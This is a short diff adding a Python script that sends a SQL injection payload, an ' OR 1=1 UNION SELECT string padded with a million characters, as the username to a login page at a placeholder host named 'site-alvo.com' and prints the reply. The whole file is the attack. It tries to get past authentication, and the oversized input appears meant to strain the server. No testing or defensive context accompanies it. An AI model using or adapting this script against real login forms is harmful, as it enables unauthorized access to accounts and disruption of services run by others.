@@ -1,0 +1,8 @@
+import requests
+
+url = "http://site-alvo.com/login"
+payload = "' OR 1=1 UNION SELECT '" + ("A" * 1000000) + "' --"
+data = {"username": payload, "password": "qualquercoisa"}
+
+response = requests.post(url, data=data)
+print(response.text)
